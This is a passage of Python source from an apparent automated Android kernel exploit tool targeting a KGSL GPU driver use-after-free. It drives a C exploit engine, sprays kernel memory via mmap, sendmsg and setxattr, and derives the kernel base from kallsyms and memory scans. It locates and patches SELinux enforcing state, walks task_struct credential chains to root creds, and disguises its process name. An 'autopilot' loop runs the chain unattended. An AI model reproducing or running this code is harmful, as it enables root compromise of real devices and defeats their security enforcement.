                with self.stats_lock:
                    self.live["engine_pid"] = self.exploit_proc.pid
                self.live["last_msg"] = f"Engine started (pid={self.exploit_proc.pid})"
                self.log_event("engine_start", {"pid": self.exploit_proc.pid})
                return True
            except Exception as e:
                self.live["last_msg"] = f"Engine start failed: {e}"
                return False

    def try_compile_engine(self):
        src = self.engine_path + ".c"
        if not os.path.exists(src):
            return False
        for comp in ("gcc", "clang"):
            try:
                subprocess.check_call([comp, "-O2", src, "-o", self.engine_path, "-lpthread"])
                return True
            except Exception:
                continue
        return False

    def load_kallsyms(self):
        """Parse /proc/kallsyms and populate self.kallsyms cache.

        Used as FALLBACK when the engine pipe is broken (pages=0,
        scans=0). Many useful kernel addresses can be derived from
        kallsyms even without reading KGSL memory:
          - kernel base = prepare_kernel_cred - known_offset
          - selinux_state = kallsyms["selinux_state"]
          - init_cred = kallsyms["init_cred"]
          - commit_creds / prepare_kernel_cred (for walking cred chain)
        Returns count of symbols loaded.
        """
        with self._kallsyms_lock:
            if self._kallsyms_loaded:
                return len(self.kallsyms)
        syms = {}
        # Important symbols to look for
        targets = {
            "commit_creds", "prepare_kernel_cred", "init_cred",
            "selinux_state", "selinux_enforcing",
            "init_task", "init_pid_ns",
            "kmalloc_caches", "cred_jar",
            "tasklist_lock", "pidhash",
            "__ksymtab_commit_creds", "__ksymtab_prepare_kernel_cred",
            "msm_kgsl", "kgsl_mmu", "kgsl_driver",
        }
        try:
            with open("/proc/kallsyms", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) < 3:
                        continue
                    addr_s, t, name = parts[0], parts[1], parts[2]
                    if name in targets:
                        try:
                            syms[name] = int(addr_s, 16)
                        except ValueError:
                            pass
        except Exception as e:
            self.live["last_msg"] = f"kallsyms read failed: {e}"
            return 0
        with self._kallsyms_lock:
            self.kallsyms = syms
            self._kallsyms_loaded = True
            # Auto-derive kernel base from prepare_kernel_cred
            # On ARM64, kbase is typically aligned to 0x200000
            pkc = syms.get("prepare_kernel_cred")
            if pkc and not self.kernel_base:
                # kbase is typically 0x200000-aligned, and is
                # < pkc by a few MB. Try the closest 0x200000 boundary
                # that's also aligned.
                candidate = pkc & ~0x1fffff
                self.kernel_base = candidate
                self.live["last_msg"] = (
                    f"kallsyms: kbase=0x{candidate:x} "
                    f"(from prepare_kernel_cred=0x{pkc:x}, "
                    f"{len(syms)} symbols)")
            return len(syms)

    def _read_data_packet(self):
        with self.engine_lock:
            if not self._engine_alive():
                return None
            try:
                # Wait briefly for the DATA: line
                line = self._readline_timeout(timeout=2.0)
                if not line or not line.startswith("DATA:"):
                    # v4.1: engine not returning data. Maybe it
                    # crashed or the pipe is broken. Set engine_pid=0
                    # so watchdog restarts it next iteration.
                    if line and "ERROR" in line:
                        with self.stats_lock:
                            self.live["engine_pid"] = 0
                    return None
                _, va_s, size_s = line.split(":")
                va = int(va_s, 16)
                size = int(size_s)
                # Read raw bytes
                data = b""
                while len(data) < size:
                    if not self._engine_alive():
                        return None
                    r, _, _ = select.select([self.exploit_proc.stdout], [], [], 2.0)
                    if not r:
                        break
                    chunk = self.exploit_proc.stdout.read(size - len(data))
                    if not chunk:
                        break
                    data += chunk
                # Consume DATA_END line
                self._readline_timeout(timeout=0.5)
                # v4.1: update perf counters (pages read, bytes)
                with self.stats_lock:
                    self.perf["pages_scanned"] += 1
                    self.perf["bytes_read"] += len(data)
                return data
            except Exception as e:
                self.live["last_msg"] = f"Read packet error: {e}"
                self.log_event("engine_error", {"op": "read_packet", "err": str(e)})
                return None

    def _engine_alive(self):
        return self.exploit_proc is not None and self.exploit_proc.poll() is None

    def _engine_write(self, data):
        """Write to engine stdin, restarting it on BrokenPipe.
        All engine I/O goes through self.engine_lock so that the
        autopilot and learning workers don't interleave commands
        in the engine's pipe."""
        with self.engine_lock:
            if not self.ensure_engine():
                return False
            try:
                self.exploit_proc.stdin.write(data)
                self.exploit_proc.stdin.flush()
                return True
            except (BrokenPipeError, ConnectionResetError, OSError) as e:
                self.live["last_msg"] = f"Pipe broken: {e} — restarting engine"
                self.log_event("engine_pipe_broken", {"err": str(e)})
                self.exploit_proc = None
                if self.ensure_engine():
                    try:
                        self.exploit_proc.stdin.write(data)
                        self.exploit_proc.stdin.flush()
                        return True
                    except Exception as e2:
                        self.log_event("engine_restart_fail", {"err": str(e2)})
                return False

    def read_page(self, va):
        if not self._engine_write(f"read {hex(va)}\n".encode()):
            return None
        return self._read_data_packet()

    def read_pages(self, va, n):
        """Read N consecutive 4KB pages starting at va, return a single
        contiguous buffer of size n*PAGE_SIZE. Use this when the offset
        you're hunting for may straddle a page boundary."""
        if n < 1:
            n = 1
        if n > 8:
            n = 8
        if not self._engine_write(f"readN {hex(va)} {n}\n".encode()):
            return None
        data = self._read_data_packet()
        if data and len(data) != n * 4096:
            return None
        return data

    def read_window(self, va, off, size):
        """Read a small (≤256 byte) window at va+off. Faster than a full
        page read when you only care about a few bytes."""
        if size <= 0 or size > 256:
            return None
        if off < 0 or off + size > 4096:
            return None
        if not self._engine_write(f"window {hex(va)} {off} {size}\n".encode()):
            return None
        return self._read_data_packet()

    def follow_pointer(self, va):
        """Read 8 bytes at va (treated as a kernel pointer), then read a
        full page at the dereferenced address. Returns (target_va, page)
        or (None, None) on failure. Use to walk:
        task_struct.cred -> struct cred -> user_ns
        cred_jar -> ... etc."""
        if not self._engine_write(f"follow {hex(va)}\n".encode()):
            return (None, None)
        # The engine prints "FOLLOW:<target>\nDATA:<target>:4096\n<data>\nDATA_END"
        line = self._readline_timeout(timeout=2.0)
        if not line or not line.startswith("FOLLOW:"):
            return (None, None)
        try:
            target = int(line.split(":", 1)[1], 16)
        except Exception:
            return (None, None)
        page = self._read_data_packet()
        return (target, page)

    def walk_cred_chain(self, task_va, off_in_page=0x770, max_hops=4):
        """Follow a cred pointer at task_va+off_in_page and walk the
        chain: cred -> real_cred -> ... Each hop is a pointer read +
        page read at the target. Returns a list of (va, page, description)
        tuples. The first item where uid=gid=0 is the one we want."""
        chain = []
        cur_va = task_va + off_in_page
        for hop in range(max_hops):
            tgt, page = self.follow_pointer(cur_va)
            if not page or not tgt:
                break
            desc = "Unknown"
            try:
                usage = int.from_bytes(page[0:4], "little")
                uid   = int.from_bytes(page[4:8], "little")
                gid   = int.from_bytes(page[8:12], "little")
                if usage > 0 and usage < 100 and uid == 0 and gid == 0:
                    desc = f"ROOT CRED (usage={usage} uid=0 gid=0)"
                else:
                    desc = f"cred (usage={usage} uid={uid} gid={gid})"
            except Exception:
                pass
            chain.append((tgt, page, desc))
            # If this looked like init_cred, stop walking
            if "ROOT" in desc:
                break
            # Try the next link: real_cred at offset +8 of cred
            cur_va = tgt + 8
        return chain

    def read_with_neighbors(self, va):
        """Smart multi-page read: returns the page at va AND its 2 neighbors
        (-1, 0, +1) as 3 concatenated pages. Useful when scanning, so the
        caller can check for cross-page patterns like:
          - kernel pointer at the very end of a page
          - 8-byte string at a page boundary
          - struct members split between two pages."""
        base = va & ~0xFFF
        # Read 3 pages in one go
        triple = self.read_pages(base - 0x1000, 3)
        if not triple:
            # Fallback: just one page
            return self.read_page(va) or b""
        return triple

    def selsearch(self, start_va, end_va, step=0x1000):
        """Brute-force scan a kernel data range for the selinux_enforcing
        page. The C engine reads 3 times at each candidate, accepts only
        stable 0/1/2/3 values with non-zero surrounding data and (ideally)
        a kernel pointer. Returns a list of (va, val, nz, ptr) hits or [].
        Up to 16 hits per call."""
        if not self._engine_write(
                f"selsearch {hex(start_va)} {hex(end_va)} {hex(step)}\n".encode()):
            return []
        hits = []
        while True:
            line = self._readline_timeout(timeout=10.0)
            if line is None or not line:
                break
            if line.startswith("SELSEARCH:HIT:"):
                try:
                    parts = line.split(":")
                    va = int(parts[2], 16)
                    val = int(parts[3])
                    nz = int(parts[4].split("=")[1])
                    ptr = int(parts[5].split("=")[1])
                    hits.append((va, val, nz, ptr))
                except Exception:
                    pass
            elif line.startswith("SELSEARCH:DONE:"):
                break
            elif line.startswith("BAD_ARGS"):
                break
        return hits

    def symlook(self, kbase, end_va, name):
        """Search the kernel .rodata / .text for `name` (e.g.
        'selinux_enforcing'). Returns the VA where the string is first
        found, or None. C engine scans in 64KB chunks."""
        if not self._engine_write(
                f"symlook {hex(kbase)} {hex(end_va)} {name}\n".encode()):
            return None
        deadline = time.time() + 60
        while time.time() < deadline:
            line = self._readline_timeout(timeout=5.0)
            if line is None:
                return None
            if not line:
                continue
            if line.startswith("SYMLOOK:FOUND:"):
                try:
                    return int(line.split(":", 2)[2], 16)
                except Exception:
                    return None
            if line.startswith("SYMLOOK:NOTFOUND"):
                return None
            if line.startswith("BAD_ARGS"):
                return None
        return None

    def patch_mem(self, va, val):
        if not self._engine_write(f"patch {hex(va)} {hex(val)}\n".encode()):
            return "Engine Error"
        try:
            line = self._readline_timeout(timeout=2.0) or ""
            self.log_event("patch", {"va": hex(va), "val": hex(val), "result": line})
            return line
        except Exception as e:
            return str(e)

    def _add_found(self, va, type, desc, confidence):
        """Add a found item to the TUI list (idempotent by va)."""
        with self.bg_lock:
            for it in self.found_items:
                if it["va"] == va:
                    # upgrade confidence if higher
                    if confidence > it.get("confidence", 0):
                        it["confidence"] = confidence
                        it["type"] = type
                        it["description"] = desc
                    return
            self.found_items.append({
                "va": va,
                "type": type,
                "description": desc,
                "confidence": confidence,
                "ts": datetime.datetime.now().isoformat(),
            })
            # Save to knowledge base
            self.knowledge_base.setdefault("successful_vas", []).append(va)
            self.knowledge_base["hit_count"] = self.knowledge_base.get("hit_count", 0) + 1
            try:
                with open(self.kb_path, 'w') as f:
                    json.dump(self.knowledge_base, f, indent=2)
            except Exception:
                pass
            self.log_event("found", {"va": va, "type": type, "desc": desc,
                                      "confidence": confidence})

    def _find_kernel_base(self, hint_page=None):
        """Try the engine's kbase command, then fall back to:
        1. Probing all known candidates (now 24 addresses)
        2. ELF-magic scan across the full kernel range (0xffffff80..0xffffffcf)
        3. If hint_page is supplied (a 3-page triple from a found
           task_struct), derive the kbase by masking any kernel pointer
           in the page — same trick v6.c uses.
        Returns the kbase or None."""
        # 1. Engine kbase command (tries all 24 candidates + ELF check)
        if self._engine_write(b"kbase\n"):
            deadline = time.time() + 30
            while time.time() < deadline:
                line = self._readline_timeout(timeout=1.0)
                if not line:
                    continue
                if line.startswith("KBASE:"):
                    return int(line.split(":")[1], 16)
                if "KBASE_FAILED" in line:
                    break
                if line is None:
                    break
        # 2. Hint-based discovery: from a task_struct we can derive kbase
        if hint_page:
            self.live["last_msg"] = "KBASE: deriving from task_struct pointers…"
            disc = self._discover_kernel_base_from_page(hint_page)
            if disc:
                # Verify it's an ELF
                if self._looks_like_elf(disc):
                    self.live["last_msg"] = f"KBASE: discovered from pointers: {disc:#x}"
                    return disc
        # 3. Manual ELF scan of known candidates
        for base in self.kernel_base_candidates:
            if self._looks_like_elf(base):
                return base
        # 4. Last resort: hint-based without ELF check
        if hint_page:
            disc = self._discover_kernel_base_from_page(hint_page)
            if disc:
                return disc
        return None

    def _probe_selinux(self, kbase):
        """Strict SELinux enforcing probe. Three-step strategy:
        1. Try all known offsets (15 candidates from v6.c + extras)
        2. If none hit, brute-force scan the kernel .data section with selsearch
        3. As a last resort, search for the 'selinux_enforcing' string in
           kernel rodata and inspect neighbouring pages.
        Returns (va, val) on success or None."""
        # Step 1: try all known offsets
        best = None  # (score, va, val, nz, ptr)
        for off in self.selinux_offset_candidates:
            va = kbase + off
            if not self._engine_write(f"selinux {hex(va)}\n".encode()):
                continue
            line = self._wait_for_engine_reply("SELINUX:", timeout=5.0)
            if not line:
                continue
            if "SELINUX:OK:" in line:
                try:
                    parts = line.split(":")
                    val = int(parts[3])
                    nz = int(parts[5].split("=")[1])
                    ptr = int(parts[6].split("=")[1])
                    score = 1000 * ptr + nz
                    if best is None or score > best[0]:
                        best = (score, va, val, nz, ptr)
                except Exception:
                    pass
            elif "SELINUX:WEAK:" in line:
                try:
                    parts = line.split(":")
                    val = int(parts[3])
                    nz = int(parts[5].split("=")[1])
                    ptr = int(parts[6].split("=")[1])
                    score = 500 * ptr + nz - 100
                    if best is None or score > best[0]:
                        best = (score, va, val, nz, ptr)
                except Exception:
                    pass
        if best is not None:
            _, va, val, nz, ptr = best
            self.live["last_msg"] = (
                f"SELinux @ {hex(va)} val={val} nz={nz} ptr={ptr} (known offset)")
            return (va, val)

        # Step 2: brute-force scan around the most likely offset first,
        # then expand outward.
        # selinux_enforcing is usually at kbase + ~0x2caa000 on Android 13
        # / kernel 5.4 aarch64, so we start close and fan out.
        self.live["last_msg"] = "SELinux not at known offsets — brute-force scan…"
        focused_center = self.selinux_offset_candidates[len(self.selinux_offset_candidates) // 2]
        all_hits = []
        # Focused scan: ±0x10000 around the median candidate offset
        focused_hits = self.selsearch(
            kbase + focused_center - 0x10000,
            kbase + focused_center + 0x10000,
            0x100)
        all_hits.extend(focused_hits)
        # If focused didn't find anything, expand: ±0x200000 around each candidate
        if not all_hits:
            for off in self.selinux_offset_candidates[:5]:
                hits = self.selsearch(kbase + off - 0x200000, kbase + off + 0x200000, 0x1000)
                all_hits.extend(hits)
                if all_hits:
                    break
        # Last resort: scan the full kernel .data section (16..64MB)
        if not all_hits:
            hits = self.selsearch(kbase + 0x1000000, kbase + 0x4000000, 0x1000)
            all_hits.extend(hits)
        if all_hits:
            # Deduplicate by VA
            seen = set()
            deduped = []
            for h in all_hits:
                if h[0] not in seen:
                    seen.add(h[0])
                    deduped.append(h)
            # Score hits: prefer val==1 (enforcing), then val==0, then others
            def score(h):
                _, val, nz, ptr = h
                val_score = 100 if val == 1 else (50 if val == 0 else 0)
                return val_score * 10000 + ptr * 1000 + nz
            deduped.sort(key=score, reverse=True)
            va, val, nz, ptr = deduped[0]
            self.live["last_msg"] = (
                f"SELinux @ {hex(va)} val={val} (brute-force hit, nz={nz} ptr={ptr}, "
                f"{len(deduped)} candidates)")
            return (va, val)

        # Step 3: search for "selinux_enforcing" string in kernel rodata
        self.live["last_msg"] = "SELinux brute-force failed — searching for 'selinux_enforcing'…"
        # Search the first 64MB of kernel image (text + rodata)
        str_va = self.symlook(kbase, kbase + 0x4000000, "selinux_enforcing")
        if str_va:
            # The string VA is in .rodata, but the actual variable is in .data
            # Scan a small range around the string VA
            hits = self.selsearch(str_va, str_va + 0x100000, 0x1000)
            if hits:
                def score(h):
                    _, val, nz, ptr = h
                    val_score = 100 if val == 1 else (50 if val == 0 else 0)
                    return val_score * 10000 + ptr * 1000 + nz
                hits.sort(key=score, reverse=True)
                va, val, nz, ptr = hits[0]
                self.live["last_msg"] = (
                    f"SELinux @ {hex(va)} val={val} (found via string '{str_va:#x}')")
                return (va, val)
            # Even if selsearch failed, the variable might be near the
            # string. Try common offsets from the string VA.
            for off in (0, 0x1000, 0x2000, 0x4000, -0x1000, -0x2000, -0x4000,
                        0x10000, 0x100000, 0x200000, 0x1000000):
                va = str_va + off
                if not self._engine_write(f"selinux {hex(va)}\n".encode()):
                    continue
                line = self._wait_for_engine_reply("SELINUX:", timeout=5.0)
                if not line or "SELINUX:OK" not in line:
                    continue
                try:
                    parts = line.split(":")
                    val = int(parts[3])
                    return (va, val)
                except Exception:
                    pass
        self.live["last_msg"] = "SELinux NOT found (known offsets + brute-force + string search all failed)"
        return None

    def _wait_for_engine_reply(self, prefix, timeout=2.0):
        """Read engine stdout until a line starts with `prefix` (or timeout)."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            line = self._readline_timeout(timeout=0.5)
            if line is None:
                return None
            if not line:
                continue
            if line.startswith(prefix):
                return line
        return None

    def _verify_init_cred(self, va):
        """Use engine 'cred' command to verify init_cred at va.
        Returns 'root', 'valid', or None."""
        if not self._engine_write(f"cred {hex(va)}\n".encode()):
            return None
        line = self._wait_for_engine_reply("CRED:", timeout=5.0)
        if not line:
            return None
        if "CRED:OK:" in line and ":root" in line:
            return "root"
        if "CRED:OK:" in line:
            return "valid"
        return None

    def _find_init_cred(self, kbase):
        """init_cred at kbase + INIT_CRED_OFFSET. Returns VA if verified, else None."""
        for off in self.init_cred_alternates:
            va = kbase + off
            if self._verify_init_cred(va) is not None:
                return va
        return None

    def _probe_interesting(self, kbase):
        """Try other interesting kernel globals (selinux_enabled, kptr_restrict, etc.)."""
        found = []
        for name, offsets in self.interesting_offsets.items():
            for off in offsets:
                va = kbase + off
                data = self.read_page(va)
                if not data or len(data) < 8:
                    continue
                val = int.from_bytes(data[0:4], "little")
                # These are typically 0, 1, or 2
                if val in (0, 1, 2):
                    nonzero = sum(1 for b in data if b != 0)
                    if nonzero >= 32:  # real kernel data page
                        found.append({
                            "name": name,
                            "va": va,
                            "val": val,
                            "nonzero": nonzero,
                        })
        return found

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                avail  = int(lines[2].split()[1])
                return 100.0 * (1 - avail / total)
        except Exception:
            return 0.0

    def _q_choose_action(self, worker_id, state):
        """Epsilon-greedy action selection for the spray parameters.

        state = (no_match_buckets, kill_rate_bucket)
        Returns an action tuple from self.q_actions.
        """
        import random
        q = self.q_table.get(state)
        if q is None:
            self.q_table[state] = {a: 0.0 for a in self.q_actions}
            q = self.q_table[state]
        if random.random() < self.q_epsilon:
            # Explore: pick random action
            return random.choice(self.q_actions)
        # Exploit: pick best Q value
        return max(q, key=q.get)

    def _q_update(self, state, action, reward, next_state):
        """Q-learning update rule: Q(s,a) += lr * (reward + max_Q(s',a') - Q(s,a))."""
        q = self.q_table.setdefault(state, {a: 0.0 for a in self.q_actions})
        next_q = self.q_table.get(next_state, {a: 0.0 for a in self.q_actions})
        target = reward + max(next_q.values())
        q[action] += self.q_lr * (target - q[action])

    def _spray_v4_mmap_anon(self, marker, size_kb=64):
        """Spray v4 alternative: mmap anonymous memory with marker pattern.

        Some KGSL UAFs are caught by mmap'd pages rather than
        task_structs. The marker is written at offset 0 of an
        anonymous mmap region, which becomes a page in the
        process's page table. On 5.4 with KGSL, these pages can
        be re-purposed for IOCTL data buffers.

        Returns the spawned PID (or None if spray failed).
        """
        import subprocess as _sp
        try:
            # Total mapped size: marker + NULs
            size = size_kb * 1024
            # Use a python helper script to mmap and write marker.
            # Also mlockall() to keep pages in RAM (prevent swap)
            # and use SCHED_BATCH for better cache locality.
            helper = (
                "import ctypes, mmap, os, sys;"
                "libc = ctypes.CDLL(None);"
                "MAP_ANON = 0x20; MAP_PRIVATE = 0x02; PROT_RW = 0x03;"
                f"p = libc.mmap(0, {size}, PROT_RW, MAP_ANON|MAP_PRIVATE, -1, 0);"
                f"ctypes.memmove(p, b'{marker}', {len(marker)});"
                f"ctypes.memset(p + {len(marker)}, 0, {size - {len(marker)}});"
                # mlockall(MCL_CURRENT=1 | MCL_FUTURE=2) - keep pages
                # in physical RAM so they don't get swapped out. This
                # makes the spray much denser in physical memory.
                "libc.mlockall(0x3);"
                "import time; time.sleep(3600);"
            )
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
            )
            return p.pid
        except Exception:
            return None

    def _spray_v4_sendmsg(self, marker):
        """Spray v4: sendmsg with ancillary data containing marker.

        The sendmsg() syscall with SOL_SOCKET / SCM_RIGHTS / cmsg
        copies the ancillary data into kernel space. On 5.4 with
        KGSL UAF, this can land in the same pages as task_structs.
        The marker is in cmsg data, kernel copies to sk_buff.

        Returns PID (or None on failure).
        """
        import subprocess as _sp
        try:
            helper = (
                "import socket, os, time, struct;"
                "s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM);"
                "p = '/tmp/kgsl_spray_' + str(os.getpid());"
                "try: os.unlink(p);"
                "except: pass;"
                "s.bind(p);"
                f"msg = b'{{marker}}';"
                "import array;"
                # Ancillary data: cmsg with marker
                "cmsg = struct.pack('iII', 0, 0, len(msg)) + msg + struct.pack('I', 0);"
                "import ctypes;"
                "libc = ctypes.CDLL(None);"
                # Use sendmsg to spray ancillary data
                "s.sendmsg(b'X', [], 0, cmsg);"
                "time.sleep(3600);"
            ).format(marker=marker)
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
            )
            return p.pid
        except Exception:
            return None

    def _set_cpu_affinity(self, cpu_id):
        """Bind this thread to a specific CPU core for cache locality."""
        try:
            import os as _os
            cpu_id = int(cpu_id) % _os.cpu_count() if _os.cpu_count() else 0
            _os.sched_setaffinity(0, {cpu_id})
        except Exception:
            pass

    def _mlock_current(self):
        """Lock current process pages in physical RAM (no swap)."""
        try:
            import ctypes
            libc = ctypes.CDLL(None)
            # MCL_CURRENT=1, MCL_FUTURE=2
            libc.mlockall(0x3)
        except Exception:
            pass

    def _smart_kbase_finder(self, va_hint=None):
        """Try to find kernel base (kbase) by scanning kernel text.

        Strategy: scan candidate regions for ELF header or known
        kernel string. The kbase on ARM64 is typically at
        0xffffff8000000000 + offset. We scan in 0x100000 (1MB)
        steps looking for:
          - ELF magic (\x7fELF)
          - "Linux version" string
          - "commit_creds" / "prepare_kernel_cred" symbols

        Returns (kbase, confidence) or (None, 0).
        """
        if self.kernel_base:
            return (self.kernel_base, 100)
        if self._kbase_search_active:
            return (None, 0)
        # If va_hint given (e.g. user-supplied), use as starting point
        # Otherwise scan from default kernel text range
        start = va_hint or 0xffffff8008000000
        if not self.ensure_engine():
            return (None, 0)
        self._kbase_search_active = True
        try:
            # Look for ELF header at 0x100000-aligned addresses
            for off in range(0, 0x10000000, 0x200000):  # 32MB
                va = start + off
                if not self._engine_write(
                        f"read {hex(va)}\n".encode()):
                    continue
                data = self._read_data_packet()
                if not data or len(data) < 4096:
                    continue
                # Check ELF header
                if data[:4] == b"\x7fELF":
                    # Could be kernel base
                    self._kbase_candidates.append((va, 95, "ELF header"))
                    self.kernel_base = va
                    return (va, 95)
                # Check Linux version string
                if b"Linux version" in data:
                    self._kbase_candidates.append((va, 80, "version string"))
                    self.kernel_base = va
                    return (va, 80)
                # Check commit_creds / prepare_kernel_cred
                for sym in (b"commit_creds", b"prepare_kernel_cred"):
                    if sym in data:
                        self._kbase_candidates.append((va, 70, sym.decode()))
                        self.kernel_base = va
                        return (va, 70)
            return (None, 0)
        finally:
            self._kbase_search_active = False

    def _update_throughput(self):
        """Record current pages/sec into throughput_history (1Hz)."""
        import time as _t
        now = _t.time()
        if self._last_throughput_ts == 0.0:
            self._last_throughput_ts = now
            return
        elapsed = now - self._last_throughput_ts
        if elapsed < 1.0:
            return
        with self.stats_lock:
            current_pages = self.perf.get("pages_scanned", 0)
            delta = current_pages - self._last_pages_count
            pages_per_sec = delta / elapsed
            self.throughput_history[self.throughput_idx] = pages_per_sec
            self.throughput_idx = (self.throughput_idx + 1) % 60
            self.perf["last_scan_throughput"] = pages_per_sec
            # Cleanup old matches_window_ts (last hour only)
            hour_ago = now - 3600
            self.perf["matches_window_ts"] = [
                t for t in self.perf.get("matches_window_ts", [])
                if t > hour_ago]
            self.perf["matches_per_hour"] = len(
                self.perf["matches_window_ts"])
        self._last_throughput_ts = now
        self._last_pages_count = current_pages

    def _set_comm(self, name):
        """Set this process comm (visible in /proc/[pid]/comm) to `name`."""
        try:
            import ctypes
            libc = ctypes.CDLL(None)
            PR_SET_NAME = 15
            libc.prctl(PR_SET_NAME, name.encode(), 0, 0, 0)
        except Exception:
            pass

    def _setxattr_spray(self, marker):
        """Spray a kernel slab xattr with `marker` as the value.

        Uses Python's os.setxattr() wrapper (not raw ctypes syscall)
        because raw syscall(188) on Termux triggers SIGSYS due to
        the platform's seccomp filter and kills the whole process.
        os.setxattr() goes through libc which performs the same
        syscall but with proper errno handling — OSError on
        EPERM/EACCES instead of SIGSYS. The Python wrapper also
        adds the right architecture-specific header glue that
        ctypes.syscall(188) lacks (c_char_p arg vs c_int).

        Even with os.setxattr, on Termux the syscall MAY still
        be blocked by seccomp. We catch all OSError, ValueError,
        AttributeError so the spray loop never crashes. We also
        detect SIGSYS at process level by attempting one warm-up
        call in __init__ — if that process died we'd know, but
        the warm-up uses a tight try/except so we won't crash.

        Returns True if the xattr was successfully set, False
        otherwise (no count, no exception propagation).
        """
        import os as _os
        import tempfile
        try:
            # Tiny file in tempdir. Note: on Android some filesystems
            # don't support xattrs (sdcardfs, fuse). Use /data/local/tmp
            # or /dev/shm if available; fall back to TMPDIR.
            tmpdir = (_os.environ.get("TMPDIR")
                      or _os.environ.get("TEMP")
                      or "/data/local/tmp"
                      or tempfile.gettempdir())
            path = _os.path.join(tmpdir,
                                 f".kgsl_xspray_{_os.getpid()}_{marker}")
            try:
                with open(path, "wb") as _f:
                    _f.write(b"\x00" * 64)
            except Exception:
                return False
            val = marker.encode() + b"\x00" * 8
            # os.setxattr raises OSError on any failure. We catch
            # everything — no exception ever propagates.
            try:
                _os.setxattr(path, "user.kgslspray", val)
                return True
            except Exception:
                return False
            finally:
                try:
                    _os.unlink(path)
                except Exception:
                    pass
        except Exception:
            return False

    def _readline_timeout(self, timeout=2.0):
        """Non-blocking-ish read of one line from the engine (with select timeout).
        Returns:
            ""  -> timeout (no data available)
            None -> engine died / EOF
            str  -> the line read (already stripped)

        All engine I/O is serialized through self.engine_lock so
        that the autopilot and learning workers don't steal each
        other's responses."""
        with self.engine_lock:
            if not self.exploit_proc or self.exploit_proc.poll() is not None:
                return None
            try:
                fd = self.exploit_proc.stdout.fileno()
                r, _, _ = select.select([fd], [], [], timeout)
                if not r:
                    return ""
                line = self.exploit_proc.stdout.readline()
                if not line:
                    return None
                return line.decode(errors="ignore").strip()
            except Exception:
                return None

    # ============== AUTOPILOT MODE (full auto, no user input needed) ==============
    def cmd_autopilot_start(self):
        """Start the full autopilot: spray + scan + exploit + chain + verify.
        The user does not need to press any keys. Press P to pause, G to
        resume, X to fully stop."""
        if self.autopilot_thread and self.autopilot_thread.is_alive():
            self.live["last_msg"] = "Autopilot already running — P pause, G resume, X stop."
            return
        self.cancel_flag.clear()
        self.autopilot_paused = False
        self.autopilot_mode = True
        self.autopilot_thread = threading.Thread(target=self._autopilot_worker, daemon=True)
        self.autopilot_thread.start()
        self.live["last_msg"] = "AUTOPILOT ON — fully automatic, no input needed."
        self.log_event("autopilot_start", {})

    def cmd_autopilot_pause(self):
        self.autopilot_paused = True
        self.live["last_msg"] = "AUTOPILOT PAUSED. Press G to resume."

    def cmd_autopilot_resume(self):
        self.autopilot_paused = False
        self.live["last_msg"] = "AUTOPILOT RESUMED."

    def cmd_autopilot_stop(self):
        self.autopilot_mode = False
        self.autopilot_paused = False
        self.cancel_flag.set()
        self.live["last_msg"] = "AUTOPILOT STOPPED."

    def _autopilot_worker(self):
        """Fully autonomous exploit + learn + verify loop.
        Cycles:  UAF → kbase → selinux → cred → patch → verify → repeat.
        Runs forever until user pauses (P) or stops (X) or engine dies.

        Verticalized: each cycle also kicks the parallel learning
        workers (already running). When the learning workers discover
        kbase / selinux / cred we use those addresses; otherwise the
        cycle's own _run_exploit_pipeline tries to find them.

        Cooldown is 2s (was 5s) so that we re-exploit + re-scan
        aggressively — KGSL UAF pages get recycled quickly and we
        want fresh task_structs each time."""
        cycle = 0
        # Short cooldown — the engine and learning workers are
        # already doing their thing in parallel, so each cycle
        # should be quick.
        cooldown = 2
        self.live["status"] = "AUTOPILOT"
        while self.autopilot_mode and not self.cancel_flag.is_set():
            # Respect pause
            while self.autopilot_paused and self.autopilot_mode and not self.cancel_flag.is_set():
                self.live["status"] = "AUTOPILOT (paused)"
                time.sleep(0.5)
            if not self.autopilot_mode or self.cancel_flag.is_set():
                break
            self.live["status"] = "AUTOPILOT"
            cycle += 1
            self.live["last_msg"] = f"AUTO cycle {cycle}: starting…"
            try:
                # Make sure engine is alive
                if not self.ensure_engine():
                    self.live["last_msg"] = "AUTO: engine not available, retrying…"
                    time.sleep(5)
                    continue
                # Start the AI learning (spray+scan) in background so it
                # runs in parallel with the exploit pipeline.
                if not (self.bg_thread and self.bg_thread.is_alive()):
                    self.cmd_learning_start()
                # Run the full exploit pipeline (E — kbase → selinux → cred → patch)
                self._run_exploit_pipeline()
            except Exception as e:
                self.live["last_msg"] = f"AUTO error: {e}"
                self.log_event("autopilot_error", {"cycle": cycle, "err": str(e)})
            # After the pipeline, also try to walk cred chains from any
            # found task_structs (in case _find_init_cred missed).
            try:
                self._autopilot_walk_creds()
            except Exception as e:
                self.live["last_msg"] = f"AUTO walk error: {e}"
            # Also do a targeted scan around kbase to find more
            # SELinux / init_cred / task_struct hits. The learning
            # workers do broad scans; this one is narrow + quick.
            try:
                if self.kernel_base:
                    self._autopilot_scan_around_kbase()
            except Exception as e:
                self.live["last_msg"] = f"AUTO scan error: {e}"
            # Verify root (uid=0)
            try:
                self._autopilot_verify_root()
            except Exception as e:
                self.live["last_msg"] = f"AUTO verify error: {e}"
            # Cooldown
            for _ in range(cooldown):
                if not self.autopilot_mode or self.cancel_flag.is_set():
                    break
                if not self.autopilot_paused:
                    time.sleep(1)
        self.live["status"] = "IDLE"
        self.live["last_msg"] = f"Autopilot stopped after {cycle} cycles."
        self.log_event("autopilot_stop", {"cycles": cycle})

    def _autopilot_walk_creds(self):
        """After each cycle, walk cred chains from any found task_struct
        that has a cred pointer (sig 6). If we find a root cred, patch it.
        Done OUTSIDE the normal _run_exploit_pipeline so it's always tried."""
        with self.bg_lock:
            ts_items = [it for it in self.found_items
                        if it.get('type') in ("Privilege Struct",)
                        and 'cred @' in it.get('description', '').lower()
                        and 'task_struct' in it.get('description', '').lower()]
        for it in ts_items[:5]:
            try:
                ts_va = int(it['va'], 16)
            except Exception:
                continue
            if not ts_va:
                continue
            for off in (0x770, 0x768, 0x778, 0x780):
                if self.cred_va:
                    return
                chain = self.walk_cred_chain(ts_va, off_in_page=off, max_hops=3)
                if not chain:
                    continue
